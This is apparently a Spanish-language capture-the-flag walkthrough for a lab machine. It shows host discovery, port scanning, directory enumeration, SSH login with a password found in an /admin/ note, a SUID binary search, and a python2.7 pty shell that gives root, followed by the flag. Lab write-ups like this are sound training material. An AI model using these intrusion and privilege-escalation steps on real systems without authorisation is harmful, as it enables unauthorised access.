Primero Obtenemos la IP de nuestra maquina atacante:
```
ifconfig
```

Utilizando " netdiscover " procedemos a encontrar los equipos conectados en la red:
```
sudo netdiscover -r 192.168.1.0/24
```

Una ves encontrada la IP de la maquina victima comenzamos a realizar un escaneo de puertos, utilizaremos " nmap ":
```
sudo nmap -sV -A -T5 192.168.1.30
```
![[nmap.png]]

Encontramos que tenemos los puertos:
- 22 corriendo un servicio " ssh "
- 80 corriendo un servicio " web - apache "
Revisamos en el navegador con la IP de la maquina victima para ver si tiene desplegado un sitio web.
![[paguina_web.png]]

Revisamos el código de la paguina web:
![[codigo_web.png]]

Procedemos a realizar una enumeración de directorios con la IP de la victima utilizando la herramienta " dirsearch ".
```
dirsearch -u http://192.168.1.12/
```
![[dirsearch.png]]

vemos una repuesta " /admin/ " al cual entramos para revisar y encontramos una nota, donde el usuario mensiona de una contraseña " 12345ted123 " y podemos decir que " ted " puede ser nombre de usuario.
![[nota.png]]

Con esta información intentaremos conectarnos por " ssh "
- contraseña: 12345ted123
```
ssh ted@192.168.1.12
```
![[ssh.png]]

Buscamos los archivos que tiene permisos el usuario ted para ver si podemos encontrar un forma de poder aprovechar la escalabilidad de privilegios " SUID Binaries ". 
```
find / -perm -u=s -type f 2>/dev/nul
```
l![[files.png]]

Podemos usar " python2.7 " para abrir una shell interactiva y elevar privilegios con un pequeño programa. 
```
python2.7 -c 'import pty;pty.spawn("/bin/sh")'
```
![[root.png]]

Una ves siendo root buscaremos la flag /root/flag.txt:
- Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
![[flag.png]]






















